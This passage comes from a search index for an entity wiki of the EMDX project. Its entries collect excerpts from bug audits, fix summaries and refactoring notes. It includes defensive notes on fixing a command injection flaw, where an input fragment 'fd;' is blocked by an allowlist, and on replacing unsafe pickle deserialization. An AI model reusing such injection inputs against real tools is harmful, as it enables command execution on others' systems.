sqlite3.Connection | None = None\n) -&gt; list[str]:\n</code></pre> <p>NECESSARY \u2014 Allows optional co...</p> <ul> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>...d_tags_to_document(doc_id, tags, conn=conn) <code>`` The</code>conn<code>parameter is passed to</code>add_tags_to_document()` which uses it directly without committing, ensuring a single atomic transaction.</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...<code>save_document()</code> in <code>emdx/database/documents.py</code> to pass existing connection to <code>add_tags_to_document()</code></p> </li> <li>Document + tags now inserted in single atomic transaction</li> <li>Moved <code>conn.commit()</code> after tagging to ensure rollback on tag failure</li> <li> <p>Fixed <code>lastrowid</code> access to ha...</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 1. Transaction Isolation Failures (Multiple Locations)</p> <p>...rtial writes may commit</p> </li> <li><code>documents.py:24-49</code> \u2014 Commits after INSERT, then calls <code>add_tags_to_document()</code> in separate transaction</li> <li> <p><code>cascade.py:257-308</code> \u2014 Opens two separate connections for related operations</p> </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: CRITICAL ISSUES (3)</p> <p>The function commits after INSERT (line 41), then calls <code>add_tags_to_document()</code> which opens a NEW connection with separate transactions. If tagging fails, the document exists but tags are not applied\u2014no rollback mechanism.</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>In <code>add_tags_to_document()</code>, when a tag already exists for a document (IntegrityError), the function silently continues without incrementing <code>usage_count</code>. This is correct. However, the tag is not added to <code>added_tags</code> list, which is also correct.</p> </li> </ul>"},{"location":"entities/addtagstodocument/#related-entities","title":"Related Entities","text":"<ul> <li><code>remove_tags_from_document()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>testsuggestaliases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tests/test_models_tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testreversealiases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testnormalizetagtoemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testistextalias</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testisemojitag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testgetcategoryemojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testgetaliasesforemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testexpandaliasstring</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/after/","title":"after:","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2025-07-07</p>"},{"location":"entities/after/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Phase 1: Critical Fixes (Immediate - 30 minutes)</p> </li> <li> <p>#6848 Delegate: ARCH-14: Add click as an explicit dependency in pyproject.to [3/4]   Section: Summary</p> <p>Change made: Updated <code>pyproject.toml</code> line 29:</p> </li> <li>Before: <code>click = \"&gt;=8.1.0\"  # Typer 0.15+ requires click 8.1+</code></li> <li> <p>After: <code>click = \"&gt;=8.0.0\"  # Typer 0.23+ requires click 8.0+</code></p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Before vs After</p> <p>After: Rich-formatted help with examples section, options grouped into logical panels (Options, Git &amp; PRs, Organization), cleaner descriptions.</p> </li> <li> <p>#6784 Delegate: --help [2/2]   Section: Changes Summary</p> <p>...e:** Flat list of 20+ options with no grouping, verbose help text, no examples</p> </li> <li> <p>After: Organized panels (Options, Git &amp; PRs, Organization, Commands), concise descriptions, formatted examples section with <code>$ emdx delegate ...</code> usage patterns...</p> </li> <li> <p>#6405 Bug Fix PR Reviews [4/6]   Section: Security Impact</p> <ul> <li>Before: Pickle deserialization could execute arbitrary code if cache file was tampered with</li> </ul> </li> <li> <p>After: JSON and scipy.sparse NPZ are safe formats that cannot execute code</p> </li> <li> <p>#6403 Bug Fix PR Reviews [1/6]   Section: Code Analysis</p> </li> <li> <p>#6383 Strategy: EMDX as Agent Workspace   Section: Identity Shift</p> <p>Before: \"EMDX is a CLI knowledge base and documentation management system.\" After: \"EMDX is an agent workspace \u2014 a knowledge base that AI agents use to plan, execute, and persist their work, with a human dashboard for oversight.\"</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Security Impact</p> <p>After: Command is rejected because:</p> </li> <li><code>shlex.split()</code> parses \"fd;\" as the command name</li> <li>\"fd;\" is not in the allowlist \u2192 exit with error</li> <li> <p>Even if it somehow passed, <code>shell=False</code> prevents metacharacter interpretation</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>After:</p> </li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> <li>Added <code>_validate_discovery_command()</code> function that:</li> <li> <p>Parse...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 2. Clarified Tag Input Format</p> <p>Updated <code>delegate.py</code> help text for <code>--tags</code> option:</p> </li> <li>Before: \"Tags to apply to outputs (comma-separated)\"</li> <li> <p>After: \"Tags to apply to outputs (comma-separated or multiple -t flags)\"</p> </li> <li> <p>#6247 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [13/37]   Section: Changes Made</p> </li> <li>Before: Only Python 3.13</li> <li>After: Python 3.11, 3.12, 3.13</li> <li> <p>Added <code>fail-fast: false</code> to run all matrix jobs even if one fails</p> </li> <li> <p>#6187 Delegate: Fix PR #453 (Ask the KB). Checkout branch feat/ask-kb. Revie [2/2]   Section: 1. DRY Refactoring - _add_filters() helper</p> <p>After: Single <code>_add_filters()</code> function at module level handles all filter combinations:</p> </li> <li>Project filtering</li> <li>Tag filtering (with emoji alias conversion)</li> <li>Recent days filtering</li> </ul>"},{"location":"entities/after/#after_1","title":"AFTER:","text":"<p>set -l script_dir (realpath (dirname (status -f))) ```</p>"},{"location":"entities/after/#1-bug-fix-masking-clause-removal","title":"1. \u2705 Bug Fix (Masking Clause Removal)","text":"<p>Before: <code>return cursor.rowcount &gt; 0 or stage is not None</code> After: <code>return cursor.rowcount &gt; 0</code></p>"},{"location":"entities/after/#1-expanded-python-test-matrix","title":"1. Expanded Python Test Matrix","text":""},{"location":"entities/after/#related-entities","title":"Related Entities","text":"<ul> <li><code>before:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=6.1)</li> <li><code>`emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>task:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>security impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>`emdx/commands/delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>approve</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>rich_markup_mode=\"rich\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>_delegate_help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> <li><code>safe_discovery_commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.0)</li> </ul>"},{"location":"entities/ai/","title":"[ai]","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/ai/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Dependencies</p> Feature Required Extras <code>compact</code> <code>[ai]</code> (anthropic), <code>[similarity]</code> (sklearn) <code>--draft</code> None (uses existing gh CLI) </li> <li> <p>#6467 emdx distill Command Implementation   Section: Integration Status</p> <p>...ckwell/emdx/pull/620)</p> </li> <li>Dependency: <code>anthropic</code> SDK remains optional (part of <code>[ai]</code> extra)</li> <li> <p>Reusability: SynthesisService designed for future <code>compact</code> command</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> <p>...B</p> </li> <li><code>_extract_title()</code> - Extract/generate title from synthesized content</li> <li>Uses <code>[ai]</code> extra (anthropic) with proper import guards</li> <li> <p>Returns <code>SynthesisResult</code> dataclass with content, title, token usage</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Task 2.1: Create <code>SynthesisService</code></p> <p>def _require_anthropic() -&gt; None:     if not HAS_ANTHROPIC:         raise ImportError(             \"anthropic is required for synthesis features. \"             \"Install it with: pip install 'emdx[ai]'\"         )</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> <p>def _require_anthropic():     if not HAS_ANTHROPIC:         raise ImportError(             \"anthropic is required for distill. \"             \"Install it with: pip install 'emdx[ai]'\"         ) ```</p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: Well-Designed Patterns Found \u2713</p> <p>...r.py<code>all use</code>try/except ImportError<code>with</code>HAS_*` flags</p> </li> <li>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, <code>[all]</code> extras are well-organized</li> <li> <p>Version flexibility - Uses <code>^</code> (caret) appropriately for semver-compatible updates</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Optional Dependencies</p> <p>Heavy ML/AI deps are optional extras:</p> </li> <li><code>[ai]</code>: sentence-transformers, scikit-learn, anthropic</li> <li><code>[similarity]</code>: TF-IDF document similarity</li> <li><code>[google]</code>: Google Docs integration</li> <li> <p><code>[all]</code>: Everything</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Database Schema Highlights</p> </li> <li><code>[ai]</code> - sentence-transformers, scikit-learn, anthropic</li> <li><code>[similarity]</code> - scikit-learn, datasketch</li> <li><code>[google]</code> - Google API client</li> <li><code>[all]</code> - Everything</li> </ul>"},{"location":"entities/ai/#optional-dependencies","title":"Optional Dependencies","text":"<p>Heavy ML dependencies are extras (not installed by default):</p>"},{"location":"entities/ai/#related-entities","title":"Related Entities","text":"<ul> <li><code>[similarity]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.6)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>discovery layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>archive layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>[google]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>[all]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synthesis (opus api)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>required extras</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/all/","title":"all","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/all/#documents-8","title":"Documents (8)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/all/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: <code>emdx/config/__init__.py</code> \u2014 stale re-exports</p> <p>The <code>__init__.py</code> re-exports 20 constants. Of those, 12 are never imported by any code outside <code>config/</code>. The entire <code>__all__</code> list and import block should be pruned to match actual usage.</p> <ul> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Summary</p> <p>Added 9 missing symbols to <code>emdx/services/__init__.py</code> <code>__all__</code> that are already publicly used by other modules. No changes needed for <code>emdx/services/cli_executor/__init__.py</code>.</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 4. DEPRECATED CODE: execute_claude_sync() (MEDIUM PRIORITY)</p> </li> <li>Update <code>commands/cascade.py</code> to use <code>execute_cli_sync(cli_tool=\"claude\", ...)</code></li> <li>Remove <code>execute_claude_sync()</code> after migration</li> <li> <p>Also remove from <code>__all__</code> export if present</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Low Severity Issues (10)</p> </li> <li><code>emdx/models/__init__.py</code></li> <li><code>emdx/services/__init__.py</code></li> <li> <p><code>emdx/config/__init__.py</code> Issue: Modules should define <code>__all__</code>...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 5. list_non_workflow_documents \u2014 DEAD CODE (4 hits)</p> Line Context Status 15-17 imports of workflow functions DEAD CODE \u2014 imported but functions are stubs 32-34 exports in <code>__all__</code> DEAD CODE </li> <li> <p>#6165 Delegate: Audit emdx/models/ and emdx/database/ for dead code. Check:  [3/17]   Section: 5. Export/Re-export of Dead Functions</p> <p>...t_non_workflow_documents<code>| |</code>emdx/services/document_service.py:30-34<code>| Same in</code>all` list |</p> </li> <li> <p>#6159 Delegate: Remove dead code from emdx/database/documents.py and emdx/se [1/2]   Section: Changes Made</p> </li> <li><code>get_document_source</code></li> <li> <p><code>get_workflow_document_ids</code></p> </li> <li> <p>#6156 Delegate: Check if the document source no-op functions (record_documen [1/5]   Section: Import Sites</p> </li> <li>Lines 13-15: imports <code>get_document_source</code> and <code>get_workflow_document_ids</code> from <code>emdx.database.documents</code></li> <li>Lines 30-32: re-exports them in <code>__all__</code></li> </ul>"},{"location":"entities/all/#recommendation","title":"Recommendation","text":""},{"location":"entities/all/#43-47-missing-__all__-in-type-critical-modules","title":"43-47. Missing <code>__all__</code> in type-critical modules","text":"<p>Files:</p>"},{"location":"entities/all/#2-emdxservicesdocument_servicepy","title":"2. emdx/services/document_service.py","text":"<p>Removed imports and <code>__all__</code> entries for:</p>"},{"location":"entities/all/#emdxservicesdocument_servicepy","title":"emdx/services/document_service.py","text":""},{"location":"entities/all/#related-entities","title":"Related Entities","text":"<ul> <li><code>record_document_source</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>workflow_run_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list_non_workflow_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>get_code_theme()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>get_workflow_document_ids()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>emdx/services/document_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>record_document_source()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>get_document_source()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/services/__init__.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/analysis/","title":"analysis","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2025-07-12</p>"},{"location":"entities/analysis/#documents-9","title":"Documents (9)","text":"<ul> <li>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Task Lifecycle and State Management <p>...ss()`</p> </li> <li>Completion: Update with result or error</li> <li> <p>Stats: Track for retry analysis</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Executive Summary</p> <p>EMDX is a dual-purpose knowledge base serving both human users and AI agents. The system has evolved to accommodate fundamentally different interaction patterns between these user types. This analysis maps every touchpoint where needs diverge.</p> </li> <li> <p>#6331 Delegate: Architecture Analysis Tags [7/12]   Section: Tag Recommendations for Document #6330</p> </li> <li> <p>#460 EMDX Slimdown Analysis: Code Reduction Opportunities   Section: Tags for This Analysis</p> <p>Recommended tags: <code>analysis</code>, <code>refactor</code>, <code>active</code></p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>gameplan</code> - Strategic plans</li> <li><code>analysis</code> - Investigation results  </li> <li> <p><code>notes</code> - General notes</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Tag Taxonomy for EMDX Project Management</p> <p>Based on analysis of current workflow patterns, here's a proposed hierarchical tag taxonomy for sophisticated project management and success tracking:</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...rkflow Tagging Claude Code could automatically apply workflow tags:</p> </li> <li><code>gameplan</code>, <code>analysis</code>, <code>todo</code>, <code>in-progress</code>, <code>completed</code></li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li> <p><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: None Type Analysis [6/7] \u2014 Service Files</p> <p>Analysis of <code>| None</code> type annotations in EMDX service files to identify which are unnecessary.</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: 1. <code>TaskDict.created_at: str | None</code> (types.py:20)</p> <p>Analysis: The <code>created_at</code> column in the database has <code>DEFAULT CURRENT_TIMESTAMP</code>, meaning it's never NULL for existing records. However, keeping <code>| None</code> is defensive...</p> </li> </ul>"},{"location":"entities/analysis/#document-summary","title":"Document Summary","text":"<p>Document #6330 is the EMDX Architecture Analysis Synthesis - a comprehensive consolidation of findings from 6 detailed architecture analyses covering ~37K lines across 132 files.</p>"},{"location":"entities/analysis/#document-types","title":"Document Types","text":""},{"location":"entities/analysis/#related-entities","title":"Related Entities","text":"<ul> <li><code>bugfix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>urgent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>successful</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>success tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>project-&lt;name&gt;-review</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>project-&lt;name&gt;-planning</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>priority-medium</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>priority-low</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>priority-high</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>in-progress</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/analyzepy/","title":"analyze.py","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-01-11</p>"},{"location":"entities/analyzepy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>project: str | None = typer.Option(None, ...)</code> - Legitimate: optional filter</li> <li> <p>Internal functions return <code>str | None</code> - Legitimate: may have nothing to report</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...------| | cascade.py | 1 | 1 | Yes (doc param) | | status.py | 1 | 1 | Partial | | analyze.py | 7 | 7 | Yes (new TypedDicts) | | prime.py | 6 | 6 | Yes (partial) | | recipe.py | 1 | 1 | Yes (doc param) | | briefing.py | 6 | 5 | Yes (new TypedDicts) | | groups...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...<code>cascade.py</code> imports <code>cascade_db</code>, <code>get_document</code>, <code>save_document</code></p> </li> <li><code>status.py</code>, <code>analyze.py</code>, <code>prime.py</code> import <code>db_connection</code> directly</li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 3. Inconsistent Patterns</p> <p>Files using pattern 2: <code>analyze.py</code>, <code>prime.py</code>, <code>status.py</code>, <code>maintain.py</code></p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 2. HIGH: <code>commands/analyze.py</code> Contains 700+ Lines of Business Logic**</p> <p>File: <code>commands/analyze.py</code> (744 lines)</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...tatus\" | | <code>prime.py</code> | \"Output priming context for Claude session injection\" | | <code>analyze.py</code> | \"Analyze documents and extract insights\" | | <code>maintain.py</code> | \"Database maintenance and cleanup operations\" |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> Module Has Test File? <code>analyze.py</code> \u274c NO <code>ask.py</code> \u274c NO <code>browse.py</code> \u2705 YES (<code>test_browse.py</code>) <code>cascade.py</code> \u26a0\ufe0f PARTIAL (<code>test_cascade_metadata.py</code> tests DB, not CLI) <code>core.py</code> \u2705... </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...\u2713\\n   - <code>emdx/utils/environment.py</code> \u2713\\n\\nNot Yet Completed:\\n- <code>emdx/commands/analyze.py</code> - PENDING (still has <code>console = Console()</code>)\\n- <code>emdx/commands/executions.py</code> - PENDING (still has <code>console = Console()</code>)\\n- <code>emdx/ui/markdown_config.py</code> - Has local...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>....py**: All necessary</p> </li> <li>epics.py: All necessary</li> <li>ask.py: All necessary</li> <li>analyze.py: All necessary</li> <li>trash.py: All necessary</li> <li>review.py: All necessary</li> <li>prime.py: All necessary</li> <li>categories.py: All necessary</li> <li> <p>browse.py: All n...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...imilarity: 578 LOC). Total dependency: ~2,254 LOC for a rarely-used feature. | | analyze.py | 732 | OVER-ENGINEERED - Analysis dashboard. Mostly read-only views of maintain.py data. | | executions.py | 561 | SUPPORT - Execution history viewer....</p> </li> </ul>"},{"location":"entities/analyzepy/#analyzepy_1","title":"analyze.py","text":""},{"location":"entities/analyzepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>gdoc.py</code> 